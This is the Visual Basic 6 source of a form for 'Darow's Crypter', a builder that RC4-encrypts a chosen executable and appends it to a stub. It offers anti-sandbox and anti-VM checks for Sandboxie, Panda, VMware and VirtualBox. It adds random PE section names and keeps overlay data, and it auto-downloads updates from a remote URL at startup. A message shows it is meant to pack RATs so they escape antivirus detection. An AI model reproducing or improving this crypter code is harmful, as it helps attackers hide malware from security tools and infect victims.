VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form frmMain 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Darow's Crypter"
   ClientHeight    =   4950
   ClientLeft      =   9855
   ClientTop       =   5010
   ClientWidth     =   3165
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   4950
   ScaleWidth      =   3165
   Begin DarowsCrypter.jcbutton cmdAbout 
      Height          =   375
      Left            =   120
      TabIndex        =   20
      Top             =   4560
      Visible         =   0   'False
      Width           =   735
      _ExtentX        =   1296
      _ExtentY        =   661
      ButtonStyle     =   13
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      BackColor       =   0
      Caption         =   "About"
      PictureEffectOnOver=   0
      PictureEffectOnDown=   0
      CaptionEffects  =   0
      TooltipBackColor=   0
   End
   Begin VB.Frame Frame3 
      Caption         =   "Icon"
      Height          =   1695
      Left            =   120
      TabIndex        =   17
      Top             =   4800
      Visible         =   0   'False
      Width           =   3015
      Begin DarowsCrypter.jcbutton Command2 
         Height          =   375
         Left            =   2160
         TabIndex        =   19
         Top             =   240
         Width           =   735
         _ExtentX        =   1296
         _ExtentY        =   661
         ButtonStyle     =   13
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         BackColor       =   0
         Caption         =   "Browse"
         PictureEffectOnOver=   0
         PictureEffectOnDown=   0
         CaptionEffects  =   0
         TooltipBackColor=   0
      End
      Begin VB.TextBox Text3 
         Height          =   285
         Left            =   120
         TabIndex        =   18
         Top             =   360
         Width           =   1815
      End
      Begin VB.Image Image1 
         Height          =   735
         Left            =   120
         Top             =   720
         Width           =   855
      End
   End
   Begin VB.Frame Frame2 
      Caption         =   "Anti's"
      Height          =   1935
      Left            =   120
      TabIndex        =   12
      Top             =   2640
      Width           =   3015
      Begin VB.CheckBox ChkVBox 
         Caption         =   "Other VBOX"
         Height          =   255
         Left            =   120
         TabIndex        =   16
         Top             =   1440
         Width           =   1215
      End
      Begin VB.CheckBox ChkVM 
         Caption         =   "VmWare"
         Height          =   255
         Left            =   120
         TabIndex        =   15
         Top             =   1080
         Width           =   1215
      End
      Begin VB.CheckBox ChkSB2 
         Caption         =   "Panda SB"
         Height          =   255
         Left            =   120
         TabIndex        =   14
         Top             =   720
         Width           =   1215
      End
      Begin VB.CheckBox chkSB 
         Caption         =   "Sandboxie"
         Height          =   255
         Left            =   120
         TabIndex        =   13
         Top             =   360
         Width           =   1215
      End
   End
   Begin DarowsCrypter.jcbutton cmdBrowse 
      Height          =   375
      Left            =   2280
      TabIndex        =   8
      Top             =   480
      Width           =   735
      _ExtentX        =   1296
      _ExtentY        =   661
      ButtonStyle     =   13
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      BackColor       =   0
      Caption         =   "Browse"
      PictureEffectOnOver=   0
      PictureEffectOnDown=   0
      CaptionEffects  =   0
      TooltipBackColor=   0
   End
   Begin DarowsCrypter.jcbutton cmdBuild 
      Height          =   375
      Left            =   2280
      TabIndex        =   7
      Top             =   4560
      Width           =   735
      _ExtentX        =   1296
      _ExtentY        =   661
      ButtonStyle     =   13
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      BackColor       =   0
      Caption         =   "Build"
      PictureEffectOnOver=   0
      PictureEffectOnDown=   0
      CaptionEffects  =   0
      TooltipBackColor=   0
   End
   Begin VB.Frame Frame1 
      Caption         =   "File Options"
      Height          =   1575
      Left            =   120
      TabIndex        =   2
      Top             =   1080
      Width           =   3015
      Begin DarowsCrypter.jcbutton Command1 
         Height          =   375
         Left            =   2160
         TabIndex        =   10
         Top             =   960
         Width           =   735
         _ExtentX        =   1296
         _ExtentY        =   661
         ButtonStyle     =   13
         Enabled         =   0   'False
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         BackColor       =   0
         Caption         =   "Browse"
         PictureEffectOnOver=   0
         PictureEffectOnDown=   0
         CaptionEffects  =   0
         TooltipBackColor=   0
      End
      Begin DarowsCrypter.jcbutton cmdGen 
         Height          =   375
         Left            =   2160
         TabIndex        =   9
         Top             =   360
         Width           =   735
         _ExtentX        =   1296
         _ExtentY        =   661
         ButtonStyle     =   13
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         BackColor       =   0
         Caption         =   "Gen"
         PictureEffectOnOver=   0
         PictureEffectOnDown=   0
         CaptionEffects  =   0
         TooltipBackColor=   0
      End
      Begin VB.TextBox Text2 
         Enabled         =   0   'False
         Height          =   285
         Left            =   120
         TabIndex        =   6
         Top             =   1080
         Width           =   1935
      End
      Begin VB.TextBox Text1 
         Height          =   285
         Left            =   120
         TabIndex        =   4
         Top             =   480
         Width           =   1935
      End
      Begin VB.Label Label3 
         Caption         =   "Clone File Info:"
         Enabled         =   0   'False
         Height          =   255
         Left            =   120
         TabIndex        =   5
         Top             =   840
         Width           =   1095
      End
      Begin VB.Label Label2 
         Caption         =   "Key:"
         Height          =   255
         Left            =   120
         TabIndex        =   3
         Top             =   240
         Width           =   855
      End
   End
   Begin MSComDlg.CommonDialog CD 
      Left            =   7800
      Top             =   2880
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.TextBox txtFile 
      Height          =   285
      Left            =   120
      TabIndex        =   1
      Top             =   600
      Width           =   2055
   End
   Begin VB.Label Label5 
      Height          =   255
      Left            =   0
      TabIndex        =   11
      Top             =   0
      Width           =   2415
   End
   Begin VB.Label Label1 
      Caption         =   "File:"
      Height          =   255
      Left            =   120
      TabIndex        =   0
      Top             =   360
      Width           =   975
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Sub InternetCloseHandle Lib "wininet.dll" (ByVal hInet As Long)
Private Declare Function InternetOpenA Lib "wininet.dll" (ByVal sAgent As String, ByVal lAccessType As Long, ByVal sProxyName As String, ByVal sProxyBypass As String, ByVal lFlags As Long) As Long
Private Declare Function InternetOpenUrlA Lib "wininet.dll" (ByVal hOpen As Long, ByVal sURL As String, ByVal sHeaders As String, ByVal lLength As Long, ByVal lFlags As Long, ByVal lContext As Long) As Long
Private Declare Sub InternetReadFile Lib "wininet.dll" (ByVal hFile As Long, ByVal sBuffer As String, ByVal lNumBytesToRead As Long, lNumberOfBytesRead As Long)
Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (pDst As Any, pSrc As Any, ByVal ByteLen As Long)
Private Declare Function InternetOpenUrl Lib "wininet" Alias "InternetOpenUrlA" (ByVal hInternetSession As Long, ByVal lpszUrl As String, ByVal lpszHeaders As String, ByVal dwHeadersLength As Long, ByVal dwFlags As Long, ByVal dwContext As Long) As Long
Private Declare Function InternetOpen Lib "wininet" Alias "InternetOpenA" (ByVal sAgent As String, ByVal lAccessType As Long, ByVal sProxyName As String, ByVal sProxyBypass As String, ByVal lFlags As Long) As Long
Private Const UserAgent = "myagent@gmail.com"
Private Const INTERNET_OPEN_TYPE_DIRECT = 1
Private Const INTERNET_OPEN_TYPE_PROXY = 3
Private Const INTERNET_FLAG_RELOAD = &H80000000

Private Sub cmdAbout_Click()
frmAbout.Show
End Sub

Private Sub cmdBrowse_Click()

With CD
        .DialogTitle = "Select The file you Want to Protect"
        .Filter = "EXE Files |*.exe"
        .ShowOpen
End With

If Not CD.FileName = vbNullString Then

txtFile.Text = CD.FileName

End If

End Sub

Public Function RC4(ByVal Data As String, ByVal Password As String) As String ' This is a Modified RC4 Function ^^
On Error Resume Next
Dim F(0 To 255) As Integer, x, Y As Long, Key() As Byte
Key() = StrConv(Password, vbFromUnicode)
For x = 0 To 255
    Y = (Y + F(x) + Key(x Mod Len(Password))) Mod 256
    F(x) = x
Next x
Key() = StrConv(Data, vbFromUnicode)
For x = 0 To Len(Data)
    Y = (Y + F(Y) + 1) Mod 256
    Key(x) = Key(x) Xor F(temp + F((Y + F(Y)) Mod 254))
Next x
RC4 = StrConv(Key, vbUnicode)
End Function

Private Sub cmdBuild_Click()
Dim dwSettingsRVA As Long, dwSettingsRaw As Long
Dim SecName As String
Dim SecName2 As String
SecName = "." & RandomLetter & RandomLetter & RandomLetter & ""
SecName2 = "." & RandomLetter & RandomLetter & RandomLetter & ""

If txtFile.Text = "" Then
MsgBox "Please choose a file"
Exit Sub
End If

If Text1.Text = "" Then
MsgBox "Please generate a encryption key!"
Exit Sub
End If

Dim sStub As String

Open App.Path & "\stub.exe" For Binary As #1
sStub = Space(LOF(1))
Get #1, , sStub
Close #1

Open App.Path & "\stubtemp.exe" For Binary As #1
Put #1, , sStub
Close #1

AddSection App.Path & "\stubtemp.exe", SecName, 500, &H8


Open App.Path & "\stubtemp.exe" For Binary As #1
sStub = Space(LOF(1))
Get #1, , sStub
Close #1

With CD
        .DialogTitle = "Select Where you want to Save Crypted File"
        .Filter = "EXE Files |*.exe"
        .ShowSave

End With

Dim File As String

Open txtFile.Text For Binary As #1
File = Space(LOF(1))
Get #1, , File
Close #1

File = RC4(File, Text1.Text)


Open CD.FileName For Binary As #1
Put #1, , sStub & "LKQEOPQWE!" & File & "KQKK!K" & Text1.Text & "KQKK!K" & chkSB.Value & "KQKK!K" & ChkSB2.Value & "KQKK!K" & ChkVM.Value & "KQKK!K" & ChkVBox.Value & "KQKK!K"
Close #1


Dim EOFmain As String
EOFmain = ReadEOFData(txtFile.Text)

'If Text2.Text <> "" Then
'Call CloneFileInformation(Text2.Text, CD.FileName)
'End If
'
'If Text3.Text <> "" Then
'Call ChangeIcon(CD.FileName, Image1.Picture)
'End If

Call WriteEOFData(CD.FileName, EOFmain)

If RealignPEFromFile(CD.FileName) = True Then
MsgBox "File crypted"
End If


Kill App.Path & "\stubtemp.exe"

End Sub

Private Sub cmdGen_Click()
Text1.Text = RandomNum2 & RandomNum2 & RandomNum2 & RandomNum2 & RandomNum2 & RandomNum2 & RandomNum2 & RandomNum2 & RandomNum2 & RandomNum2
End Sub

Public Function RandomLetter() As String
  RandomLetter = ""
  Dim Keyset As String
  Keyset = "abcdefghijklmnopqrstuvwyxz"
Anfang:
  Randomize
  var1 = Int(26 * Rnd)
  If var1 = 0 Then GoTo Anfang
  RandomLetter = Mid(Keyset, var1, 1)
End Function
Public Function RandomNumber() As String
  RandomNumber = ""
als:
  Randomize
  var1 = Int(9 * Rnd)
  RandomNumber = var1
If RandomNumber = "0" Then GoTo als
End Function

Public Function RandomNum2() As String
  RandomNum2 = ""
  Dim Keyset As String
  Keyset = "0123456789"
Anfang:
  Randomize
  var1 = Int(15 * Rnd)
  If var1 = 0 Then GoTo Anfang
  RandomNum2 = Mid(Keyset, var1, 2)
End Function

Private Sub Command1_Click()
MsgBox "Currently disabled due to some RAT's not supporting,Free update soon!"
'With CD
'        .DialogTitle = "Select the exe you wish to clone"
'        .Filter = "EXE Files |*.exe"
'        .ShowOpen
'End With
'
'If Not CD.FileName = vbNullString Then
'
'Text2.Text = CD.FileName
'
'End If
End Sub

Private Sub Command2_Click()
With CD
        .DialogTitle = "Select your icon"
        .Filter = "Icon Files |*.ico"
        .ShowOpen
End With

If Not CD.FileName = vbNullString Then

Text3.Text = CD.FileName

End If

Image1.Picture = LoadPicture(CD.FileName)

End Sub

Private Sub Form_Load()
On Error Resume Next
Dim sPage       As String
Dim sVersion    As String
Dim sMessage    As String
Dim sURL        As String
Dim b1() As Byte

Label5.Caption = App.Major & "." & App.Minor & "." & App.Revision

 hOpen = InternetOpenA("USER_CHECK", INTERNET_OPEN_TYPE_PRECONFIG, vbNullString, vbNullString, 0)
  If hOpen <> 0 Then
  hUrl = InternetOpenUrlA(hOpen, "", 0, 0, INTERNET_FLAG_EXISTING_CONNECT, 0)
If hUrl <> 0 Then
      sPage = Space(300)
      Call InternetReadFile(hUrl, sPage, 300, lNull)
      End If
     Call InternetCloseHandle(hUrl)
    End If
   Call InternetCloseHandle(hOpen)

sVersion = Split(sPage, "|")(0)
sMessage = Split(sPage, "|")(1)
sURL = Split(sPage, "|")(2)

Dim MsgBoxAns As VbMsgBoxResult
If sVersion > App.Major & "." & App.Minor & "." & App.Revision Then
        Call CopyURLToFile(sURL, App.Path & "\" & "Client" & sVersion & ".exe")
        MsgBox "Updated!"
            End
        End If
frmMOTD.Show
frmMOTD.SetFocus


End Sub

Private Sub Form_Terminate()
Unload frmMain
Unload frmMOTD
Unload frmAbout
End Sub

Private Sub Form_Unload(Cancel As Integer)
Unload frmMain
Unload frmMOTD
Unload frmAbout
End Sub

